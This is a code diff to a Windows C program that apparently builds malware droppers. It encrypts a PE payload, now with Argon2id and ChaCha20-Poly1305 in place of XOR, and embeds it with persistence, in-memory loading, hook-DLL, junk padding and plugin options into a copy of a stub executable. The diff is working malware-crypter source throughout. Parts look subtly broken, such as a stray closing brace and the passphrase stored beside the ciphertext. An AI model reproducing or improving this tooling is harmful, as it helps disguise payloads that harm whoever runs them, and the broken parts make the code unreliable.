@@ -2,8 +2,21 @@
 #include <stdlib.h>
 #include <string.h>
 #include <stdint.h>
+#include <stddef.h>
 #include <windows.h>
 #include "plugin.h"
+#include "crypto.h"
+#include <bcrypt.h>
+
+#define ARGON_T_COST 2
+#define ARGON_M_COST_KIB 65536
+#define ARGON_PARALLELISM 1
+
+static void secure_zero(void *ptr, size_t len) {
+    if (ptr && len) {
+        SecureZeroMemory(ptr, len);
+    }
+}
 
 #ifndef ALLOW_CONSOLE_PRINTS
 #define printf(...) ((void)0)
@@ -17,8 +30,14 @@
 #define PATH_BUF_LEN 4096
 #endif
 
-#pragma GCC diagnostic push
-#pragma GCC diagnostic ignored "-Wformat-truncation"
+#define CFG_MAGIC "STCF"
+#define CFG_VERSION 1
+
+typedef struct {
+    char magic[4];
+    uint16_t version;
+    uint16_t reserved;
+} PayloadHeader;
 
 // PayloadConfig shared type (moved to file scope so it is visible to all functions)
 typedef struct {
@@ -29,6 +48,9 @@ typedef struct {
     unsigned char load_in_memory; // 1 byte
     unsigned char payload_data[1]; // Variable length
 } PayloadConfig;
+
+// Temporary entry used when building the plugin overlay
+typedef struct { PluginEntry ent; unsigned char *blob; } EntryTmp;
 
 void hex_to_bytes(const char *hex, unsigned char *bytes, size_t len) {
     for (size_t i = 0; i < len; i++) {
@@ -61,6 +83,9 @@ int main(int argc, char *argv[]) {
 
     // Convert key_hex to bytes
     unsigned char key[32];
+#ifdef USE_KEY_VIRTUALLOCK
+    VirtualLock(key, sizeof(key));
+#endif
     hex_to_bytes(key_hex, key, 32);
     printf("Encryption key first 4 bytes: %02x %02x %02x %02x\n", key[0], key[1], key[2], key[3]);
 
@@ -88,6 +113,7 @@ int main(int argc, char *argv[]) {
     unsigned char *junk_data = NULL;
     unsigned char *dll_data = NULL;
     unsigned char *hook_dll_data = NULL;
+    unsigned char *config_blob = NULL;
     PayloadConfig *config = NULL;
     long payload_size = 0;
 
@@ -123,11 +149,59 @@ int main(int argc, char *argv[]) {
         printf("Payload has valid DOS signature (MZ).\n");
     }
 
-    // Encrypt the payload with XOR
-    for (long i = 0; i < payload_size; i++) {
-        payload_data[i] ^= key[i % 32];
+    // Encrypt payload using Argon2id-derived key + ChaCha20-Poly1305 envelope
+    uint8_t salt[CRYPTO_SALT_LEN];
+    if (BCryptGenRandom(NULL, salt, CRYPTO_SALT_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG) != 0) {
+        fprintf(stderr, "Error: RNG failed for salt generation.\n");
+        ret = 1;
+        goto cleanup;
     }
-    printf("Payload encrypted successfully, size: %ld bytes\n", payload_size);
+    uint8_t key32[CRYPTO_KEY_LEN];
+    if (crypto_argon2id_derive((const uint8_t *)key_hex, strlen(key_hex), salt, CRYPTO_SALT_LEN, ARGON_T_COST, ARGON_M_COST_KIB, ARGON_PARALLELISM, key32, sizeof(key32)) != 0) {
+        fprintf(stderr, "Error: Argon2id derive failed.\n");
+        ret = 1;
+        goto cleanup;
+    }
+
+    CryptoEnvelope env = {0};
+    env.version = CRYPTO_VERSION;
+    env.t_cost = ARGON_T_COST;
+    env.m_cost_kib = ARGON_M_COST_KIB;
+    env.parallelism = ARGON_PARALLELISM;
+    memcpy(env.salt, salt, CRYPTO_SALT_LEN);
+    env.ciphertext_len = (size_t)payload_size;
+
+    size_t ciphertext_len = (size_t)payload_size;
+    unsigned char *ciphertext = malloc(ciphertext_len);
+    if (!ciphertext) {
+        fprintf(stderr, "Error: Could not allocate ciphertext buffer.\n");
+        ret = 1;
+        goto cleanup;
+    }
+
+    if (crypto_chacha20_poly1305_encrypt(payload_data, (size_t)payload_size, key32, NULL, 0, &env, ciphertext) != 0) {
+        fprintf(stderr, "Error: ChaCha20-Poly1305 encryption failed.\n");
+        secure_zero(key32, sizeof(key32));
+        free(ciphertext);
+        ret = 1;
+        goto cleanup;
+    }
+    secure_zero(key32, sizeof(key32));
+
+    size_t stored_len = sizeof(CryptoEnvelope) + ciphertext_len;
+    unsigned char *enc_blob = malloc(stored_len);
+    if (!enc_blob) {
+        fprintf(stderr, "Error: Could not allocate encrypted blob buffer.\n");
+        free(ciphertext);
+        ret = 1;
+        goto cleanup;
+    }
+    CryptoEnvelope env_store = env;
+    env_store.ciphertext = NULL; // do not persist pointers
+    memcpy(enc_blob, &env_store, sizeof(CryptoEnvelope));
+    memcpy(enc_blob + sizeof(CryptoEnvelope), ciphertext, ciphertext_len);
+    free(ciphertext);
+    printf("Payload encrypted (ChaCha20-Poly1305) size: %ld bytes\n", payload_size);
 
     // Calculate junk URL count and generate junk data
     long target_size_bytes = junk_size_mb * 1024 * 1024;
@@ -150,28 +224,38 @@ int main(int argc, char *argv[]) {
         printf("No junk URLs to generate (junk_size_mb = %d).\n", junk_size_mb);
     }
 
-    // Calculate the total size using offsetof to ensure correct allocation
-    size_t config_size = offsetof(PayloadConfig, payload_data) + payload_size;
-    printf("PayloadConfig size: fixed part=%zu, payload_size=%ld, total=%zu bytes\n",
-           offsetof(PayloadConfig, payload_data), payload_size, config_size);
-    printf("Offset of payload_data: %zu\n", offsetof(PayloadConfig, payload_data));
+        // Calculate the total size using offsetof to ensure correct allocation
+        stored_len = sizeof(CryptoEnvelope) + (size_t)payload_size;
+        size_t config_size = offsetof(PayloadConfig, payload_data) + stored_len;
+        size_t blob_size = sizeof(PayloadHeader) + config_size;
+        printf("PayloadConfig size: fixed part=%zu, stored_len=%zu, plaintext_size=%ld, total=%zu bytes (with header=%zu)\n",
+            offsetof(PayloadConfig, payload_data), stored_len, payload_size, config_size, blob_size);
+        printf("Offset of payload_data: %zu\n", offsetof(PayloadConfig, payload_data));
 
-    config = malloc(config_size);
-    if (!config) {
+    config_blob = malloc(blob_size);
+    if (!config_blob) {
         fprintf(stderr, "Error: Could not allocate memory for payload config.\n");
         ret = 1;
         goto cleanup;
     }
+    memset(config_blob, 0, blob_size);
+    PayloadHeader *hdr = (PayloadHeader *)config_blob;
+    memcpy(hdr->magic, CFG_MAGIC, sizeof(hdr->magic));
+    hdr->version = CFG_VERSION;
+    hdr->reserved = 0;
+    config = (PayloadConfig *)(config_blob + sizeof(PayloadHeader));
 
     strncpy(config->key_hex, key_hex, 65);
     config->persistence = (unsigned char)persistence;
     config->junk_url_count = (uint32_t)url_count;
     config->payload_size = (uint64_t)payload_size;
     config->load_in_memory = (unsigned char)load_in_memory;
-    memcpy(config->payload_data, payload_data, payload_size);
+    memcpy(config->payload_data, enc_blob, stored_len);
     // No longer needed after copying to config; null it so cleanup doesn't double free
     free(payload_data);
     payload_data = NULL;
+    free(enc_blob);
+    enc_blob = NULL;
 
     // Copy stub.exe to the user-specified output_path
     if (!CopyFileA("stub.exe", output_path, FALSE)) {
@@ -208,7 +292,7 @@ int main(int argc, char *argv[]) {
         printf("BeginUpdateResource successful for payload.dll\n");
 
         // Add the PayloadConfig as a resource in payload.dll
-        if (!UpdateResource(hDllUpdate, "PAYLOAD", "CONFIG", MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), config, config_size)) {
+        if (!UpdateResource(hDllUpdate, "PAYLOAD", "CONFIG", MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), config_blob, blob_size)) {
             fprintf(stderr, "Error: UpdateResource for PayloadConfig in payload.dll failed: %d\n", GetLastError());
             ret = 1;
             goto cleanup;
@@ -308,12 +392,13 @@ int main(int argc, char *argv[]) {
         free(hook_dll_data);
         hook_dll_data = NULL;
     } else {
-        if (!UpdateResource(hUpdate, "PAYLOAD", "CONFIG", MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), config, config_size)) {
+        // Embed the header + config blob for disk mode as well
+        if (!UpdateResource(hUpdate, "PAYLOAD", "CONFIG", MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), config_blob, blob_size)) {
             fprintf(stderr, "Error: UpdateResource for PayloadConfig in output executable failed: %d\n", GetLastError());
             ret = 1;
             goto cleanup;
         }
-        printf("Embedded PayloadConfig resource directly into %s\n", output_path);
+        printf("Embedded PayloadConfig (with header) directly into %s\n", output_path);
     }
 
     // Embed junk URLs if any
@@ -337,18 +422,22 @@ int main(int argc, char *argv[]) {
 
     // After embedding resources, append any plugins found in the `plugins/` folder as a simple overlay.
     {
-        WIN32_FIND_DATAA fd;
-        HANDLE hFind = INVALID_HANDLE_VALUE;
-        char searchPattern[PATH_BUF_LEN];
-        const char *env_plugin_dir = getenv("PLUGIN_DIR");
-        if (env_plugin_dir && env_plugin_dir[0] != '\0') {
-            snprintf(searchPattern, PATH_BUF_LEN, "%s\\*.dll", env_plugin_dir);
+        const char *disable_plugins = getenv("PLUGIN_DIR_DISABLE");
+        if (disable_plugins && disable_plugins[0] != '\0') {
+            printf("Skipping plugin overlay (PLUGIN_DIR_DISABLE set)\n");
         } else {
-            snprintf(searchPattern, PATH_BUF_LEN, "plugins\\*.dll");
-        }
-        hFind = FindFirstFileA(searchPattern, &fd);
-        if (hFind != INVALID_HANDLE_VALUE) {
-            typedef struct { PluginEntry ent; unsigned char *blob; } EntryTmp;
+            WIN32_FIND_DATAA fd;
+            HANDLE hFind = INVALID_HANDLE_VALUE;
+            char searchPattern[PATH_BUF_LEN];
+            const char *env_plugin_dir = getenv("PLUGIN_DIR");
+            if (env_plugin_dir && env_plugin_dir[0] != '\0') {
+                snprintf(searchPattern, PATH_BUF_LEN, "%s\\*.dll", env_plugin_dir);
+            } else {
+                snprintf(searchPattern, PATH_BUF_LEN, "plugins\\*.dll");
+            }
+            hFind = FindFirstFileA(searchPattern, &fd);
+            if (hFind != INVALID_HANDLE_VALUE) {
+                printf("Scanning for plugins in: %s\n", searchPattern);
             EntryTmp *entries = NULL;
             size_t entry_count = 0;
             do {
@@ -471,10 +560,13 @@ cleanup:
     if (outf) fclose(outf);
     if (dll_data) free(dll_data);
     if (hook_dll_data) free(hook_dll_data);
-    if (config) free(config);
+    if (config_blob) free(config_blob);
     if (junk_data) free(junk_data);
     if (payload_data) free(payload_data);
+    secure_zero(key, sizeof(key));
     return ret;
 }
 
-#pragma GCC diagnostic pop
+}
+
+/* Removed GCC diagnostic pragmas to avoid push/pop mismatch on some toolchains */
